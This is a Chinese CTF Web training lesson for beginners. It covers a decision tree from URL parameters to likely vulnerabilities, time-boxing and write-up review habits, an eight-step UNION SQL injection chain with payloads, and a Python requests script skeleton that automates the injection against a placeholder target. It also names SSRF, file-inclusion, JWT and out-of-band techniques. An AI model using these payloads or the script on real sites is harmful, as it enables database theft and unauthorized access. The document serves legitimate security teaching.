| 登录 / 注册 | 弱口令、SQLi 绕过、JWT/Session 伪造、越权 |
| 上传头像 / 文件 | 文件上传绕过、图片马 + 文件包含 |
| 下载 / 导出 | 路径穿越、任意文件读取、SSRF |
| URL 预览 / 远程抓取 | SSRF |
| 评论 / 留言 / 昵称 | 存储型 XSS、SQLi |
| 个人资料 / 订单 | 水平越权（改 id） |
| 后台按钮 / 管理接口 | 垂直越权、逻辑漏洞 |

> 💡 七件事做完还没思路，就去看题目的「功能」本身：这个站是做什么的？每个功能背后都有一个潜在的漏洞类型。**先列功能，再选漏洞，比随机试 payload 快得多。**

## 题型识别决策树

*约 35 分钟*

> 🎯 **本节目标**：用一个决策树，把「一片空白」变成「三个候选方向」，并知道每个方向花多久。

把下面的树背下来（或者打印出来贴在显示器旁）。做题时顺着走，不要凭感觉乱试。

**主决策树**

```
题目给了源码吗？
├─ 给了 → 直接读源码，按「入口→变量→落点→判断」四步找漏洞
│         （PART 4 / p3l8）
└─ 没给
   ├─ URL 里有参数吗？
   │   ├─ ?id= / ?uid= / ?cat=      → 先试 SQL 注入（p5l3 / p5l4）
   │   ├─ ?file= / ?page= / ?path=   → 先试文件包含 / 路径穿越（p5l7）
   │   ├─ ?url= / ?image= / ?link=   → 先试 SSRF（p5l9）
   │   ├─ ?cmd= / ?exec=             → 命令执行（p5l8）
   │   └─ ?q= / ?search= / ?name=    → XSS / SSTI（p5l5 / p5l11）
   ├─ 有登录/注册吗？
   │   ├─ 有 → 弱口令、SQLi 登录绕过、JWT 伪造、越权（p5l15 / p5l16）
   │   └─ 无 → 继续往下
   ├─ 有上传功能吗？        → 文件上传（p5l6）
   ├─ 有 XML 输入吗？       → XXE（p5l12）
   ├─ 前端有加密/校验逻辑？ → 读 JS，控制台直接调用绕过（p1l6 / p3l2）
   └─ 什么都没有？
        └─ 信息收集：目录扫描、备份文件、.git、robots.txt（p6l3）
```

**参数名 → 首选漏洞（速查）**

| 参数名 | 首选 | 次选 |
| --- | --- | --- |
| ?id= / ?uid= | SQLi | 越权（改成别人的 id） |
| ?file= / ?page= | 文件包含 / 路径穿越 | 任意文件读取 |
| ?url= / ?image= / ?link= | SSRF | 命令执行（若被拼进命令） |
| ?cmd= / ?exec= / ?ping= | 命令执行 | 代码执行 |
| ?q= / ?search= | XSS（反射） | SQLi（拼进 like）、SSTI |
| ?name= / ?msg= | XSS（存储） | SSTI |
| ?lang= / ?tpl= | SSTI | 文件包含 |
| Cookie / Authorization | JWT 伪造 / 反序列化 | 越权 |

**拿到 flag 位置后的第二棵树**

```
需要读文件？
├─ 有文件包含 → php://filter / 日志包含
├─ 有 SSRF   → file:// / gopher://
└─ 有命令执行 → cat /flag

需要伪造身份？
├─ Cookie 里是明文 → 直接改
├─ 是 JWT          → alg=none / 弱密钥 / 算法混淆
└─ 是序列化数据    → 反序列化（p5l13 / p5l14）

需要出网但没有回显？
├─ 写文件到 web 目录
└─ DNSLog / HTTP 外带
```

> 💡 决策树的价值不是「一定对」，而是**把茫然变成有序的尝试列表**。每个分支给 2 分钟，不行就换下一个——这一步的纪律比聪明重要。

## 卡住了怎么办：五种破局

*约 30 分钟*

> 🎯 **本节目标**：建立「卡住不等于不会」的处理流程，并学会用时间盒管理自己。

**五种破局手段**

| 症状 | 动作 | 为什么有效 |
| --- | --- | --- |
| 完全没思路 | 回头补信息 | 大概率是信息没收集全：再扫目录、再读 JS、再读题面 |
| 参数试不通 | 换输入位置 | 很多题的过滤只做了 GET，换成 POST / Cookie / Header 就过了 |
| 不知道怎么拿 flag | 反向思考 | 想要 flag 需要什么能力？倒推哪个漏洞能提供这个能力 |
| 利用链差一步 | 降维验证 | 先确认「这里有没有问题」（如猜对一位长度），再想自动化 |
| 实在卡死 | 按纪律看 WriteUp | 只看「第一步从哪入手」，然后关掉自己继续做 |

**时间盒规则（很重要）**

```
单个方向：最多 15 分钟
单道题：  最多 60 分钟（入门阶段）
超时 → 记下当前思路，换题或看提示

卡住 30 分钟以上的最大原因不是难，
而是「在错误的方向上反复试同一件事」。
```

### 卡住时的三分钟自检

1. 我试过的方向，是不是都属于同一类漏洞？（如果是，换一个大类）
2. 我是不是在同一个参数上反复改，而没有换输入位置？
3. 我能不能用自己的话说出「这题到底要什么」？（说不出来就回去读题面）
4. 我把当前进度记下来了吗？（记下来，才敢放下）

> 💡 「换个方向」不等于放弃。你的目标是学会这一类题，不是死磕这一道。做完复盘，这道题的收益才算拿到。

## WriteUp 六问复盘法

*约 30 分钟*

> 🎯 **本节目标**：每道题都能转化成可复用的知识，而不是「做过了」。

做完题（或看完 WriteUp）后，强迫自己回答六个问题，写进本页底部的「我的笔记」——那里就是你的复盘本。

**六问：问什么、为什么问**

| # | 问题 | 为什么必须回答 |
| --- | --- | --- |
| 1 | 漏洞为什么会出现？（哪一行、哪个错误假设） | 决定你能不能在新题里认出同一个错误 |
| 2 | 用户输入经过了哪些处理？ | 过滤漏在哪，就是你下次的绕过点 |
| 3 | payload 每一部分有什么作用？ | 拆不开 payload = 换个环境就不会 |
| 4 | 为什么其他尝试没成功？ | 决定你下一次该先试什么，避免重复劳动 |
| 5 | 开发者应该怎么修？ | 修复思路比利用更能说明你理解了原理 |
| 6 | 换个环境还成立吗？ | 区分「这道题特有」与「通用原理」 |

**复盘模板（直接抄进笔记）**

```
## 题目：____（平台 / 题目名 / 类型）

1. 漏洞原理：
   ____（一句话：输入从哪来，被当成了什么）

2. 输入处理：
   ____（有无过滤；过滤做了什么；哪一步漏了）

3. payload 拆解：
   ____（逐段说明作用）

4. 失败尝试：
   ____（试了什么；为什么不行）

5. 修复方式：
   ____（代码层怎么改）

6. 可迁移性：
   ____（下次遇到什么特征就该想到它）
```

> 💡 只收藏 WriteUp 会产生「我好像会了」的错觉。用自己的语言复述原理，才是真正理解的开始。**建议本课程中心的「我的笔记」就是你的复盘本。**

## 入门题精讲：SQL 注入全流程

*约 45 分钟*

> 🎯 **本节目标**：从判断注入到拿到数据，完整走一遍，并把它写成可复用的脚本。

**完整链路（八步）**

```
① 判断：id=1' 报错 -> 有注入
② 字段数：order by 1..N 直到报错
③ 显位：union select 1,2,3（前缀用 -1）
④ 库名：database()
⑤ 表名：information_schema.tables
⑥ 列名：information_schema.columns
⑦ 数据：group_concat(username,0x3a,password)
⑧ 若字符被过滤：用 hex / char() / 盲注脚本
```

**每一步的判断标准**

| 步骤 | 怎么判断成功 | 失败怎么办 |
| --- | --- | --- |
| ① 判断注入 | 单引号报错 / 真假响应不同 | 换 \ / ) / " 闭合符；换 POST |
| ② 字段数 | order by N 报错，N-1 是字段数 | 从 1 二分/逐个试到 20 |
| ③ 找显位 | 页面出现 1 2 3 中的数字 | 检查是否被过滤，改用报错注入 |
| ④⑤⑥ 元数据 | 出现库名/表名/列名 | 确认 information_schema 可用（MySQL） |
| ⑦ 取数据 | 出现目标字段值 | 字段被过滤就用 hex/char 拼接 |
| ⑧ 绕过 | payload 能执行 | 见 p5l4 的 WAF 绕过表 |

做完后，用 PART 4 学的 requests 写一个脚本，把 ①~⑦ 自动化。这一步是「从会做到会写工具」的分水岭——以后同类题改个 URL 就能复用。

**把它写成脚本（骨架）**

```python
import requests

BASE = "http://target/"

def q(payload):
    return requests.get(BASE, params={"id": payload}, timeout=10).text

# 1) 判断字段数
for n in range(1, 21):
    r = q(f"1 order by {n} -- ")
    if "error" in r.lower() or "报错" in r:
        print("字段数 =", n - 1); break

# 2) 取库名（假设显位是第 2 列）
print(q("0 union select 1,database(),3 -- "))

# 3) 取表名 → 列名 → 数据（照同样结构替换 SQL 即可）
```

> 💡 把脚本存下来。以后遇到同类题，改个 URL 就能复用——这就是你自己积累的工具库。

## 综合复盘：把学过的压成一张表

*约 35 分钟*

> 🎯 **本节目标**：产出一份属于你自己的「漏洞速查表」，并找出自己的薄弱点。

下面是一张空表模板，请你按自己的理解填（可以先把本页的表格「复制」到笔记，再逐行填）。填不出来的行，就是你下一步该补的模块。

**漏洞速查表（模板）**

| 漏洞 | 入口特征 | 判断方法 | 典型 payload | 修复 |

## 下一阶段：如何持续进步

*约 25 分钟*

> 🎯 **本节目标**：知道课程结束后该往哪走，并把「持续」变成一套可执行的机制。

**三个阶段的目标**

| 阶段 | 时间 | 目标 | 衡量方式 |
| --- | --- | --- | --- |
| 打基础 | 现在–3 个月 | 走完零基础 10 节 + PART 1–4 | 能独立起服务、改包、读 JS |
| 能做题 | 3–9 个月 | PART 7 / 8 共十八节能独立复现 | 新手题 10 分钟内判断题型 |
| 能比赛 | 9–18 个月 | 打完整一场比赛并复盘 | 有 WriteUp、有 payload 库、有稳定节奏 |

- **固定刷题节奏**：每周 2–3 道，重点在复盘而不是数量。
- **建立自己的 payload 库**：按漏洞分类，每条注明适用条件。
- **写 WriteUp**：公开发布会倒逼你写清楚原理。
- **跟进组件漏洞**：Java 生态（Shiro/Fastjson/Log4j）与 PHP 生态（ThinkPHP/Laravel）的版本漏洞。
- **参加比赛**：MoeCTF、NSSCTF、CTFHub 的周赛都是好起点。

> 💡 半年能到达的合理目标是：看到一道基础 Web 题，能在 10 分钟内判断题型并列出尝试顺序。**这已经超过大多数新手了。**至于以后走渗透、应用安全还是主机安全，见 p2b5「三类岗位」那张表——方向不同，重点不同。
